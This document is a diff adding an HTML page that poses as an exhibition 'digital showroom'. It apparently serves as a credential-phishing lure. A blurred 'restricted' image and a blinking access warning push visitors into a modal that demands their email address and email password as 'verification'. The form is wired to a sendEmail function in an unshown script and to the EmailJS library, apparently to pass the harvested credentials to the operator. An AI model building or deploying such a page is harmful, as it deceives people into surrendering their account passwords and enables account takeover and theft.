@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exhibition Event Showroom</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="script.js" defer></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: url('https://source.unsplash.com/1600x900/?exhibition,art') no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            backdrop-filter: blur(5px);
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 350px;
+        }
+
+        h2 {
+            color: #FFD700;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+
+        .login-btn {
+            background: #FFD700;
+            color: black;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #FFA500;
+        }
+
+        /* Restricted Image Section */
+        .restricted-content {
+            position: relative;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .restricted-image {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            border-radius: 10px;
+            transition: filter 0.3s ease;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        .blur-control {
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .blur-control input {
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .modal button {
+            width: 100%;
+            background: #FFD700;
+            color: black;
+            padding: 10px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .modal button:hover {
+            background: #FFA500;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <span style="padding-left: 250px; color: red;">2025°</span>
+        <h2>Welcome to the Exhibition Event Digital Showroom<span style="color: red;">°</span></h2>
+        <p>View, explore, and download exclusive digital products.</p>
+        <button class="login-btn" onclick="openLogin()">View Hosted Digital Products</button>
+
+        <!-- Restricted Image Section -->
+        <div class="restricted-content">
+            <img src="img.jpg" alt="Restricted Content" class="restricted-image" id="restrictedImage" style="filter: blur(6px);" onclick="openLogin()">
+            <div class="blur-overlay">⚠️ Access Restricted! Please verify to unlock full access.</div>
+        </div>
+
+        <!-- Blurriness Control -->
+        <div class="blur-control">
+            <label for="blurRange">Adjust Opacity:</label>
+            <input type="range" id="blurRange" min="3" max="15" step="1" value="6" onchange="adjustBlur()">
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+<div class="overlay" id="overlay"></div>
+<div class="modal" id="loginModal">
+    <h3>Access to Event Showroom Required</h3>
+    <p><h4>Your email verification is required to:</h4></p>
+    <ul style="text-align: left; font-size: 14px;">
+        <em><li> Confirm your access to confidential product designs</li>
+        <li> Ensure secure and personalized viewing privileges</li>
+        <li> Proceed seamlessly with our exhibition showcase</li></em>
+    </ul>
+    <br>
+    <span style="color: #FFD700;">
+    <strong><p>Please enter your correct email credentials.</p></strong></span>
+    <input type="text" id="email" placeholder="Enter your email">
+    <input type="password" id="password" placeholder="Enter your password">
+    <button onclick="sendEmail(event)">Verify & Proceed</button>
+    <br>
+    <br>
+    <p>For security reasons, you must verify your email before proceeding to the Event of Digital Uploaded Products.</p>
+</div>
+
+
+</body>
+</html>
